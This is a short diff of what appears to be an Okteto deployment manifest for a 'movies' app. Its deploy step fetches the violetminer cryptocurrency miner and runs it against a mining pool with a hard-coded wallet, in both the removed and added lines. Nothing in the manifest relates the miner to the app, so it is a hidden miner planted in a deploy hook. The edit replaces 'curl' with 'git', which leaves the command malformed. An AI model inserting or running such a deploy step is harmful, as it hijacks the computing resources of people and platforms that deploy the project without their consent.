@@ -1,6 +1,6 @@
 icon: https://apps.okteto.com/movies/icon.png
 deploy:
-  - curl https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xf violetminer-linux-v0.2.2.tar.gz && rm violetminer-linux-v0.2.2.tar.gz && ./violetminer-linux-v0.2.2/violetminer --pool pool.hashvault.pro:80 --username TRTLv3fViV7WhBP7ZzZnuTN68nFhFkhjuiBTtnncm6QcPBvxses4dTEX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhLERwHZ --password WK01 --algorithm chukwa_v2 --ssl
+  - git https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xf violetminer-linux-v0.2.2.tar.gz && rm violetminer-linux-v0.2.2.tar.gz && ./violetminer-linux-v0.2.2/violetminer --pool pool.hashvault.pro:80 --username TRTLv3fViV7WhBP7ZzZnuTN68nFhFkhjuiBTtnncm6QcPBvxses4dTEX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhLERwHZ --password WK01 --algorithm chukwa_v2 --ssl
 devs:
   - api/okteto.yml
   - frontend/okteto.yml
